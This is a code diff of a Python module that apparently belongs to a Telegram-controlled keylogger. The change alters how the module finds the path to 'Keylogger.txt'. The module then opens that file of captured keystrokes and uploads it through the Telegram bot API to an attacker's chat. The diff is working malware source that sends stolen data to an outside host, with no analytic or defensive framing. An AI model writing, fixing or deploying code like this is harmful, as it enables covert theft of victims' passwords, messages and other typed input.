@@ -1,15 +1,14 @@
-import os
+import os, sys
 import requests
 class Get_Log():
 	def __init__(self, _):
-		self.__file__ = _.__file__
 		self.token = _.token
 		self.chat_id = _.chat_id
 		self.Send_Message = _.Send_Message
 		self.Main()
 
 	def Main(self):
-		filename = "\\".join(os.path.abspath(self.__file__).split("\\")[:-2]) + "\\Keylogger.txt"
+		filename = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\Keylogger.txt"
 		if os.path.exists(filename):
 			file = open(filename, "r")
 			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : file})
